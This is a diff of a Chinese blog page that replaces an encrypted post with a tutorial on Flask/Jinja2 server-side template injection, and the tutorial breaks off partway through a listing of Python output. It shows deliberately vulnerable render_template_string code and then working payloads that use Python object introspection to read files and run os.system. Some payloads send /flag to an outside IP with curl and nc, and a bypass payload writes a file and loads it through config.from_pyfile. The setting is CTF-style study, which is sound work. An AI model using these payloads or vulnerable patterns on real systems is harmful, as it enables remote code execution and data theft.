@@ -7,22 +7,35 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Hacker101 Encrypted Pastebin | ddddhm | glotozz&#39;blog</title>
+  <title>flask模版注入 | ddddhm | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta name="description" content="还没写完呢">
-<meta name="keywords" content="wp,cbc字节翻转攻击">
+  <meta name="description" content="很早就想整理下模版注入，短学期完了正好没事干，先从flask开始，毕竟这个框架相对比较熟悉😀">
+<meta name="keywords" content="SSTI">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hacker101 Encrypted Pastebin">
-<meta property="og:url" content="http://yoursite.com/2019/08/23/Hacker101-Encrypted-Pastebin/index.html">
+<meta property="og:title" content="flask模版注入">
+<meta property="og:url" content="http://yoursite.com/2019/09/07/flask模版注入/index.html">
 <meta property="og:site_name" content="ddddhm | glotozz&#39;blog">
-<meta property="og:description" content="还没写完呢">
+<meta property="og:description" content="很早就想整理下模版注入，短学期完了正好没事干，先从flask开始，毕竟这个框架相对比较熟悉😀">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-08-23T13:29:05.181Z">
+<meta property="og:image" content="https://i.loli.net/2019/09/07/DSzqNCFKnOGeAg9.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/07/BYxCskfGPo9tpHI.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/07/1JAjLp3mDfdKUGP.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/07/uDawZl52zQ487xS.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/07/kN5PdhqBOvnA2bR.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/07/W67DbvCBx3UjAyF.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/07/vloIJTbWrjdLx5g.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/07/ZU5HVQFqLXNioTb.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/07/KR7poDCGMatWkSX.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/07/YiIR4FtPELxohgG.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/07/dIqtMW8UsuojDTf.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/07/v3FzBVYSKuCcm9r.png">
+<meta property="og:updated_time" content="2019-09-07T08:42:18.082Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hacker101 Encrypted Pastebin">
-<meta name="twitter:description" content="还没写完呢">
+<meta name="twitter:title" content="flask模版注入">
+<meta name="twitter:description" content="很早就想整理下模版注入，短学期完了正好没事干，先从flask开始，毕竟这个框架相对比较熟悉😀">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/07/DSzqNCFKnOGeAg9.png">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -147,20 +160,20 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-Hacker101-Encrypted-Pastebin" class="article article-type-post " itemscope itemprop="blogPost">
+<article id="post-flask模版注入" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Hacker101 Encrypted Pastebin
+      flask模版注入
     </h1>
   
 
         
-        <a href="/2019/08/23/Hacker101-Encrypted-Pastebin/" class="archive-article-date">
-  	<time datetime="2019-08-23T01:23:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-23</time>
+        <a href="/2019/09/07/flask模版注入/" class="archive-article-date">
+  	<time datetime="2019-09-07T00:10:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-07</time>
 </a>
         
       </header>
@@ -172,46 +185,187 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <script src=/js/crypto-js.js></script>
-<script>
-function doDecrypt (pwd, onError) {
-	console.log('in doDecrypt');
-	const txt = document.getElementById('enc_content').innerHTML;
-	let plantext;
-	try {
-		const bytes = CryptoJS.AES.decrypt(txt, pwd);
-		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
-	} catch(err) {
-		if(onError) {
-			onError(err);
-		}
-		return;
-	}
-	document.getElementById('enc_content').innerHTML = plaintext;
-	document.getElementById('enc_content').style.display = 'block';
-	document.getElementById('enc_passwd').style.display = 'none';
-	if(typeof MathJax !== 'undefined') {
-		MathJax.Hub.Queue(
-			['resetEquationNumbers', MathJax.InputJax.TeX],
-			['PreProcess', MathJax.Hub],
-			['Reprocess', MathJax.Hub]
-		);
-	}
-}
-</script>
-<div id="enc_content" style="display:none">U2FsdGVkX18vhLmmK2ga5+aSHFdldCVkOtqN59GYTecG1n43iQfikx8OhGyHvIQZcVXiwghHyNRxvG0WIV76jHaR460JnmUsZuxqR/tUG5W7KXEXtCn0ADLq0b/qxlNsk4nKJO+ab6mHzzUYdhJNaMUK7yQRxCb3xmE+1X7/tnBXVKhGRcfFCIWI+eLmI80qFXSz2CBxDHkd4UnqnWI9AUVz1U+AZaNrxpfqDtm1gT77eqVs4wFTOFg4vbGPuHrmKJM7MgkvyUeYZ9N7rs+2fS7htmppLSKHXgH5qlOJJOI8+/fgDKoS0qEHl+dFK3lB8JJDGlPBFk4ZJeZPnNhgSeWz330yFQf+/yNnjC9ZR8CdUwhJbiEqRUsHaU0XExQ1TM/jLbQfeUyRvRegqManu6t1ShDQlgSfp5XVzLR78LASlUrF7c6hjfaN5UPXsLBrJ/RLDbsxTdvrLSlQ/DvDHZtAmPCD7myuior1LG+rIYTbYOrQ/+PFjz1M6L8cHlPZU1dVg1C5a8UehhIRI8VGrn2x4fSqgqc2puCNuT1+Qcjzq2kiSwXwgwD0mKs5v6grHyaoLqA4EfXMJ8TkWkR2f4kdGQ9IeV81KVdxXIYoR9Fm9LU54oVj5ueKF63DhUmS3OMQ1X1/BeDhCG/KypdGAKvA1TtFCX2z00WpUcDRGac=</div>
-<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
-<script>
-var onError = function(error) {
-	document.getElementById("enc_error").innerHTML = "password error!"
-};
-function decrypt() {
-var passwd = document.getElementById("enc_pwd_input").value;
-console.log(passwd);
-doDecrypt(passwd, onError);
-}
-</script>
-</div>
+        <meta name="referrer" content="no-referrer">
+
+<blockquote>
+<p>很早就想整理下模版注入，短学期完了正好没事干，先从flask开始，毕竟这个框架相对比较熟悉😀</p>
+</blockquote>
+<a id="more"></a>
+
+<h4 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h4><p>最简单的一段代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from flask import flask </span><br><span class="line"></span><br><span class="line">@app.route(&apos;/index/&apos;)</span><br><span class="line">def hello_word():</span><br><span class="line">    return &apos;hello word&apos;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>route</code>装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问<code>http://127.0.0.1:5000/index</code>的时候，flask会返回hello word</p>
+</blockquote>
+<h4 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h4><p>flask中的渲染分两种</p>
+<p>render_template和render_template_string两种，分别是渲染指定文件和指定字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">html = &apos;&lt;h1&gt;Hello World&lt;/h1&gt;&apos;</span><br><span class="line">return render_template_string(html)</span><br></pre></td></tr></table></figure>
+
+<h4 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h4><blockquote>
+<p>flask用jinja2作为渲染引擎，在网站根目录下有一个templates目录，寻找相应的html文件</p>
+</blockquote>
+<p>举个栗子，在templates文件夹中另存为<strong>hello.html</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line"> </span><br><span class="line">&lt;h1&gt;Hello &#123;&#123; name &#125;&#125;!&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在python shell运行一下脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def hello_world():</span><br><span class="line">    return render_template(&apos;hello.html&apos;,name = &apos;aaa&apos;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">   app.run()</span><br></pre></td></tr></table></figure>
+
+<p>结果如下</p>
+<p><img src="https://i.loli.net/2019/09/07/DSzqNCFKnOGeAg9.png" alt="Snipaste_2019-09-07_09-00-14.png"></p>
+<p>在jinja2中&lt;!–￼37–&gt;是变量包裹标识符</p>
+<h4 id="模版注入"><a href="#模版注入" class="headerlink" title="模版注入"></a>模版注入</h4><p>不正确的使用flask中的render_template_string()导致的SSTI</p>
+<h5 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h5><p>比如下面的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/test/&apos;)</span><br><span class="line">def test():</span><br><span class="line">    code = request.args.get(&apos;id&apos;)</span><br><span class="line">    html = &apos;&apos;&apos;</span><br><span class="line">        &lt;h3&gt;%s&lt;/h3&gt;</span><br><span class="line">    &apos;&apos;&apos;%(code)</span><br><span class="line">    return render_template_string(html)</span><br></pre></td></tr></table></figure>
+
+<p>这段代码存在漏洞的原因是数据和代码的混淆。代码中的<code>code</code>是用户可控的，会和html拼接后直接带入渲染。</p>
+<p>尝试构造xss攻击</p>
+<p><img src="https://i.loli.net/2019/09/07/BYxCskfGPo9tpHI.png" alt="Snipaste_2019-09-07_09-08-24.png"></p>
+<p>修改为如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/test/&apos;)</span><br><span class="line">def test():</span><br><span class="line">    code = request.args.get(&apos;id&apos;)</span><br><span class="line">    html = &apos;&apos;&apos;</span><br><span class="line">        &lt;h3&gt;&#123;&#123;code&#125;&#125;&lt;/h3&gt;</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    return render_template_string(html,code=code)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/07/1JAjLp3mDfdKUGP.png" alt="Snipaste_2019-09-07_09-10-03.png"></p>
+<p>可以看到，js代码被原样输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是code变量，而不是模板内容。存在漏洞的代码中，<strong>模板内容直接受用户控制</strong>。</p>
+<h5 id="SSTI文件读取-命令执行"><a href="#SSTI文件读取-命令执行" class="headerlink" title="SSTI文件读取/命令执行"></a>SSTI文件读取/命令执行</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在Jinja2模板引擎中，&lt;!–￼38–&gt;是变量包裹标识符。&lt;!–￼39–&gt;并不仅仅可以传递变量，还可以执行一些简单的表达式。</p>
+<p>这里可以联想到全局变量。输入config查看</p>
+<p><img src="https://i.loli.net/2019/09/07/uDawZl52zQ487xS.png" alt="Snipaste_2019-09-07_09-16-00.png"></p>
+<p>实现文件读取，需要利用到对象的继承</p>
+<p>先找到父类&lt;type ‘object’&gt;，再寻找子类，最后找到我们需要用到的相应模块</p>
+<p>几个魔术方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>针对python2</strong></p>
+</blockquote>
+<p>1、获取字符串的类对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;&apos;&apos;.__class__</span><br><span class="line">&lt;type &apos;str&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2、寻找基类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__</span><br><span class="line">(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</span><br></pre></td></tr></table></figure>
+
+<p>3、寻找可用的引用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;ty</span><br><span class="line">pe &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;stati</span><br><span class="line">cmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;t</span><br><span class="line">ype &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type</span><br><span class="line">&apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;</span><br><span class="line">member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.fl</span><br><span class="line">oat_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;sys.getwind</span><br><span class="line">owsversion&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;nt.stat_result&apos;&gt;, &lt;type</span><br><span class="line"> &apos;nt.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.Wea</span><br><span class="line">kSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll</span><br><span class="line">.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class</span><br><span class="line"> &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;type &apos;o</span><br><span class="line">perator.itemgetter&apos;&gt;, &lt;type &apos;operator.attrgetter&apos;&gt;, &lt;type &apos;operator.methodcaller&apos;&gt;, &lt;type &apos;functools.partial&apos;&gt;, &lt;type &apos;MultibyteCodec&apos;&gt;, &lt;type &apos;MultibyteIn</span><br><span class="line">crementalEncoder&apos;&gt;, &lt;type &apos;MultibyteIncrementalDecoder&apos;&gt;, &lt;type &apos;MultibyteStreamReader&apos;&gt;, &lt;type &apos;MultibyteStreamWriter&apos;&gt;]</span><br></pre></td></tr></table></figure>
+
+<h5 id="4、文件读取利用方法，发现40的地方存在-lt-type-‘file’-gt"><a href="#4、文件读取利用方法，发现40的地方存在-lt-type-‘file’-gt" class="headerlink" title="4、文件读取利用方法，发现40的地方存在 &lt;type ‘file’&gt;"></a>4、文件读取利用方法，发现40的地方存在 &lt;type ‘file’&gt;</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;d:/1.txt&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/07/kN5PdhqBOvnA2bR.png" alt="Snipaste_2019-09-07_09-33-31.png"></p>
+<h5 id="5、命令执行利用方法"><a href="#5、命令执行利用方法" class="headerlink" title="5、命令执行利用方法"></a>5、命令执行利用方法</h5><p>寻找包含os模块的脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">for item in &apos;&apos;.__class__.__mro__[2].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &apos;os&apos; in item.__init__.__globals__:</span><br><span class="line">             print num,item</span><br><span class="line">         num+=1</span><br><span class="line">    except:</span><br><span class="line">        print &apos;-&apos;</span><br><span class="line">        num+=1</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(72, &lt;class &apos;site._Printer&apos;&gt;)</span><br><span class="line">-</span><br><span class="line">(74, &lt;class &apos;site.Quitter&apos;&gt;)</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>构造paylaod的思路和构造文件读取的是一样的。只不过命令执行的结果无法直接看到，需要利用curl将结果发送到自己的vps或者利用ceye</p>
+<blockquote>
+<p>用我的vps实现一下</p>
+</blockquote>
+<p>题目环境：centos7+python2.7+flask，读取/flag</p>
+<p>payload</p>
+<p>先测测os模块的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">for item in &apos;&apos;.__class__.__mro__[2].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &apos;os&apos; in item.__init__.__globals__:</span><br><span class="line">             print num,item</span><br><span class="line">         num+=1</span><br><span class="line">    except:</span><br><span class="line">        print &apos;-&apos;</span><br><span class="line">        num+=1</span><br></pre></td></tr></table></figure>
+
+<p>==&gt;得到68和73，说明不同服务器的os模块不尽相同，但是相差不大，做题时可以爆破下</p>
+<p>确保服务器下能执行</p>
+<p><img src="https://i.loli.net/2019/09/07/W67DbvCBx3UjAyF.png" alt="Snipaste_2019-09-07_10-02-50.png"></p>
+<p>构造payload一</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[68].__init__.__globals__[&apos;os&apos;].system(&apos;data=$(cat /flag | base64);curl http://59.110.164.44/?data=$data;&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>vps查看，base64解密即可</p>
+<p><img src="https://i.loli.net/2019/09/07/vloIJTbWrjdLx5g.png" alt="Snipaste_2019-09-07_10-06-07.png"></p>
+<p>构造payload二(需要题目环境安装nc😄)</p>
+<p>服务器先监听端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 1439 &gt;file</span><br></pre></td></tr></table></figure>
+
+<p>访问payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[68].__init__.__globals__[&apos;os&apos;].system(&apos;nc 59.110.164.44 1439 &lt; /flag&apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/07/ZU5HVQFqLXNioTb.png" alt="Snipaste_2019-09-07_10-24-13.png"></p>
+<p>==========================================================</p>
+<p>再分析一道jinja2的ssti的bypass</p>
+<p>app.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import os #We need that to facilitate the RCE. Otherwise one needs to run &#123;&#123;config.from_object(&quot;os&quot;)&#125;&#125; first.</span><br><span class="line">from flask import Flask, render_template, render_template_string, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    exploit = request.args.get(&apos;exploit&apos;)</span><br><span class="line">    print exploit</span><br><span class="line"></span><br><span class="line">    rendered_template = render_template(&quot;app.html&quot;, exploit=exploit)</span><br><span class="line">    print(rendered_template)</span><br><span class="line"></span><br><span class="line">    return render_template_string(rendered_template)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>
+
+<p>app.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;exploit&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ok，本题先用render_template()进行一次模板渲染，再把生成的模板用render_template_string()再渲染一次</p>
+<p>如果用上面的payload，即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/flag&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<p>会出现报错，下面是第一次渲染后的模板，发现单引号被实体编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&amp;#39;&amp;#39;.__class__.__mro__[2].__subclasses__()[40](&amp;#39;/flag&amp;#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再第二次渲染的时候出现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TemplateSyntaxError: unexpected char u&apos;&amp;&apos; at 19</span><br></pre></td></tr></table></figure>
+
+<p>解决办法，不传入单引号😂</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exploit=&#123;&#123;request.__class__.__mro__[8].__subclasses__()[40](request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</span><br></pre></td></tr></table></figure>
+
+<p>类似上面的payload</p>
+<p>使用一个request模块，按照之前的流程再走一遍</p>
+<h5 id="第一步，获取类对象"><a href="#第一步，获取类对象" class="headerlink" title="第一步，获取类对象"></a>第一步，获取类对象</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;request.__class__</span><br><span class="line">&lt;class &apos;werkzeug.local.LocalProxy&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="第二部、寻找基类"><a href="#第二部、寻找基类" class="headerlink" title="第二部、寻找基类"></a>第二部、寻找基类</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request.__class__.__mro__</span><br><span class="line">(&lt;class &apos;werkzeug.local.LocalProxy&apos;&gt;, &lt;type &apos;object&apos;&gt;)</span><br></pre></td></tr></table></figure>
+
+<h5 id="第三步、寻找可用的引用"><a href="#第三步、寻找可用的引用" class="headerlink" title="第三步、寻找可用的引用"></a>第三步、寻找可用的引用</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; request.__class__.__mro__[1].__subclasses__()</span><br><span class="line">[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type 